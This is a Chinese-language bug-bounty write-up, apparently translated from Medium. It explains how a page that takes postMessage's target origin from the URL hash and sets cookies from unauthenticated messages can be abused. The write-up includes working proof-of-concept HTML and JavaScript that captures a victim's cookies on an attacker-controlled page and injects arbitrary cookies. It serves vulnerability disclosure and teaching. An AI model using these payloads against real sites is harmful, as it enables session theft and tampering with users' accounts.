***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

**![如何利用postMessage窃取编辑用户的Cookie信息](https://image.3001.net/images/20190121/1548062052_5c458d646433e.jpg!small)**
**某天，当我在做某个项目的漏洞测试时，在登录的一些HTTP请求记录中，我发现了一种利用postMessage方式窃取和编辑用户Cookie的方法。由于该测试是邀请测试，出于保密，我只能在下文中和大家分享一些方法思路。**

## postMessage介绍

相信大家都听过不同窗口之间的通信、当前窗口与内部iframe框架的通信以及一些跨域技巧，window.postMessage功能就是允许在两个客户端的窗口/frames间发送数据信息，跨域地实现通信的方法。

在HTML5中，Window.postMessage()
方法可以安全地实现跨源通信。通常，对于两个不同页面的脚本，只有当执行它们的页面位于具有相同的协议（通常为https），端口号（443为https的默认值），以及主机
(两个页面的模数 Document.domain设置为相同的值) 时，这两个脚本才能相互通信。window.postMessage()
方法提供了一种受控机制来规避此限制，只要正确的使用，这种方法就很安全。

Window.postMessage有三个参数，message、targetOrigin和可选的[transfer])，其中message代表将要发送到其他窗口的数据，targetOrigin表示接收数据消息的目标窗口，transfer代表消息的所有权。另外还有一个window.addEventListener("message",
receiveMessage,
false)，用以监听消息数据的反馈，其中的message就存在data、origin和source三个属性，origin属性表示消息数据发送方的身份，只有和原来指定发送方的协议、域名或端口一致，才能建立通信。具体请参考
[postMessage的详细介绍](https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage)。

举个例子，比如我们这有一个包含js代码的页面，用来监听记录传入的消息，其中的js代码如下：

    
    
    <script>
        function messages(event)
        {
            console.log(event);
        }
        window.addEventListener(‘message’,messages,false);
        console.log(“listening”);
     </script>
    <iframe src="url/child.html"></iframe>

在上述child.html的子页面中，存在一个向主页面的消息发送，它就调用了postMessage方法，如下：

    
    
    window.parent.postMessage("Hello parent", "target");

接下来，会发生什么呢?

首先，你访问那个会加载child.html子页面的主页面，之后，子页面会向主页面发送消息，然后，主页面接收该消息并通过控制台进行记录。这里会存在什么安全隐患吗？

> 如果攻击者能控制消息发送的目标窗口target参数值会怎样？
>
> 当然，如果子页面存在点击劫持又会怎样？

我们要思考的是，按照postMessage规范来说，如果消息发送的目标窗口target参数是星号*，表示无限制，也即可以发送到任何引用了子页面的域名中去。这样的话，就会导致一些不安全的问题出现。

## 具体测试

回到之前的漏洞测试过程中，为了更好地展示思路，接下来开始，假设我们的测试目标为域名onga.com。我通过爬虫找到了其中一个包含了HTML内容的一个HTML页面
sync.html，然后，我的工具也显示该页面中包含了一些不安全的Javascript代码。

这个文件没有其它过多的元素，只包含了一个script标记，所以这个页面看起来是起到一个中转作用。仔细分析其中的 sync.html
文件，其中包含了一个postMessage方法，它向变量名为wOrigin的目标发送了消息，如下：

![如何利用postMessage窃取编辑用户的Cookie信息](https://image.3001.net/images/20190121/1548061577_5c458b898e3b6.png!small)

    
    
    window.parent.postMessage(JSON.stringify(msg), wOrigin);

这样，我们现在就看到了两个变量，分别为msg和wOrigin。于是，我认真查找了类似变量的初始化位置，以确定是否可以对它们进行控制。很惊讶的是，msg是Cookie值，其它相关的都是用户的输入。

在分析wOrigin变量的过程中， 它在三个地方存在，第一个地方就是：

    
    
    var fdata = JSON.parse(decodeURIComponent(window.location.hash.substr(1)));
    var ns = fdata.ns;
    var worigin = fdata.worigin;

代码很简单，首先，它获取到了当前窗口的URL哈希值，然后执行编码操作（Decode）；之后，解析为json对象，接着，创建两个变量，ns代表命名空间，wOrigin代表消息的发送目标窗口。

看到window.location.hash方法，我们就会自然地想到它可以用dom-based XSS加以利用，但这个问题在此不作讨论。

所以，接下来，我继续检查其中的代码，查看 ns 和 wOrigin
在传递给postMessage方法前的一些过滤机制，啊，竟然没有！那这样的话，我们就可以想办法来构造exploit看看了。

## 构造Exploit

现在，我们需要逆向来思考这个过程：

> 首先，要创建ns 和 wOrigin 两个变量；
>
> 假设 ns=anyblah ，wOrigin=*；
>
> 创建json对象格式 {"ns":"anyblah","wOrigin":"*"}；
>
> 构造存在漏洞的URL：
>
> <http://vulnerable-onga.com/sync.html#>{"ns":"anyblah","wOrigin":"*"}

当上述URL页面被加载之后，postMessage方法会向主页面发送一个消息，但由于采用了*星号，该过程中不会限制发送目标域，消息可以发送到任何采取监听措施的域名中去。

现在，我们在主页面中来设置一个监听以接收消息：

    
    
    <script>
      function rcv(event)
       {  
           console.log(event);
       }
      window.addEventListener('message',rcv,false);
    </script>

创建一个iframe框架来加载存在漏洞的页面，并把它设置为子页面，所以最终的PoC代码可以如下：

    
    
    <script>
      function rcv(event)
       {
        console.log(event);
       }
      window.addEventListener('message',rcv,false);
    </script>
    <iframe src='http://vulnerable-onga.com/sync.html#{"ns":"anyblah","wOrigin":"*"}' />

当打开攻击者设置的包含上述代码的页面<http://attacker.com/poc.html>后，监听器将会运行，并会等待传入消息，同时，iframe框架会被加载，此时，存在漏洞的页面也一样会在iframe框架会中被加载，并会向主页面也就是攻击者控制的网站页面中发送包含有cookie的消息，最终，在我们的实例中，攻击者控制的网站会捕获到这些包含cookie的消息。

这就完了吗？

当然没有，不要忙着庆祝，这其中可能会有一些遗漏的东西，我们一起来看看。由于目标系统包含postMessage方法的文件只有57行代码，我决定好好分析一下。果然，我又在其中发现了另外一行有意思的代码：

> window.addEventListener('message', h_message);

我又赶紧检查了一下参数h_message函数的具体内容：

    
    
    function h_message(event)
    {
              var data = null;
              try { data = JSON.parse(event.data); } catch(e) { return;}
              if (data.msgType !== "write" && data.namespace !== ns) {
                return;
              }
              setCookie(data.cookieName, data.cookieVal,parseInt(data.expiresDays, 10), data.secureOnly);       
    }  
    

我们来分析一下以上代码包含的意思：  

> 传入消息中可能包含有json对象；
>
> json对象中的msgType属性可能和write属性相同；
>
> 另外一个namespace属性可能和hash中的 ”ns“相同，都是用户端控制的输入；
>
> if (data.msgType !== "write" && data.namespace !==
> ns)中使用了逻辑非和与运算，所以两组条件中都需要满足才能return返回；
>
> 否则，就会执行下一个包含其它json属性为参数的setCookie()函数。

这里确实是存在风险的，由于缺乏对消息源的认证机制，所以任意网站都可以用来发送消息并向setCookie()中传入恶意值。基于以上伟世通，我们可以构造出以下json对象来：

{"msgType":"write","namespace":"a","cookieName":"injectedt","cookieVal":"hacked","expiresDays":10,"secureOnly":false}

目标URL我们可以这样来设置：/sync.html#{"ns":"a","wOrigin":"*"}

最终的PoC页面中将包含以下代码：

    
    
    <script>
           var tar='http://onga.com/sync.html#{"ns":"a","wOrigin":"*"}';
           var pay={"msgType":"write","namespace":"a","cookieName":"injectedt","cookieVal":"hacked","expiresDays":10,"secureOnly":false};  
           var c= window.open(tar,"child");
           c.postMessage(pay,"*");
    </script>

保存包含上述代码的PoC页面为html格式并打开，cookie就能成功注入，因此攻击者端也就能向存在漏洞网站，注入任意cookie数据信息，实现间接的cookie窃取和编辑操作了。如下视频所示：  

看不到？点[这里](https://v.qq.com/x/page/y0830r1vmdv.html)

### 参考：

> <http://www.sec-1.com/blog/wp-content/uploads/2016/08/Hunting--postMessage-> Vulnerabilities.pdf>
>
> <https://www.youtube.com/watch?v=XTKqQ9mhcgM>
>
> <https://robertnyman.com/2010/03/18/postmessage-in-html5-to-send-messages-> between-windows-and-iframes/>
>
> <https://gist.github.com/YasserGersy/1fc77ff9b678fb5028a272a86c1d2ea1>
>
> <https://ngailong.wordpress.com/2018/02/13/the-mystery-of-postmessage/>

***参考来源：[medium](https://medium.com/bugbountywriteup/exploiting-post-message-to-steal-users-cookies-7df43a00289a)，clouds编译，转载请注明来自FreeBuf.COM**

